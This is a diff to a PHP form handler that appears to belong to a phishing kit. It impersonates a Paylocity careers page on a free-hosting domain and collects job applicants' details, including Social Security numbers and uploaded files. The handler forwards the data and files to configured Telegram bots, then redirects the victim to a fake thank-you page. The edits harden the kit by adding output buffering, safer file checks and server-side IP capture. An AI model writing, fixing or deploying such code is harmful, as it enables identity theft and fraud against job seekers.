@@ -1,4 +1,6 @@
 <?php
+ob_start(); // Start output buffering to prevent headers already sent
+
 include 'firewall.php';
 
 // 🌐 Site map: define how each site should behave
@@ -18,15 +20,9 @@ $site_map = [
         'redirect' => 'https://thepaylocity.rf.gd/cache_site/careers/all-listings.job.34092/thankyou.html'
     ],
 
-    "localhost" => [
-        "bots" => [
-            ["token" => "TESTTOKEN", "chat_id" => "TESTCHAT"]
-        ],
-        "redirect" => "http://localhost/thankyou.html"
-    ],
+
     // Add more sites...
 ];
-
 
 // 🧠 Determine origin domain (not PHP host)
 $referer = $_SERVER['HTTP_REFERER'] ?? '';
@@ -75,7 +71,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $job_type = htmlspecialchars($_POST['q24_jobType'] ?? '');
     $source = htmlspecialchars($_POST['q21_howDid21'] ?? '');
     $ssn = htmlspecialchars($_POST['q25_socSec'] ?? '');
-    $ip = htmlspecialchars($_POST['ip'] ?? 'No ip');
+    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
     $timestamp = date("Y-m-d H:i:s");
 
     // 📦 Upload handler
@@ -131,7 +127,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
     // 📤 Send files
     function sendFile($file, $caption, $bots) {
-        if (!file_exists($file)) return;
+        if (!$file || !is_string($file) || !file_exists($file)) return;
         $is_image = in_array(strtolower(pathinfo($file, PATHINFO_EXTENSION)), ['jpg', 'jpeg', 'png', 'gif']);
 
         foreach ($bots as $bot) {
@@ -156,7 +152,19 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
     log_entry("✅ [$domain] Job application received from $ip ($full_name)");
 
+    ob_end_clean(); // Discard any unexpected output before redirect
     header("Location: " . $config['redirect']);
     exit;
 }
 ?>
+
+
+
+
+
+
+
+
+
+
+
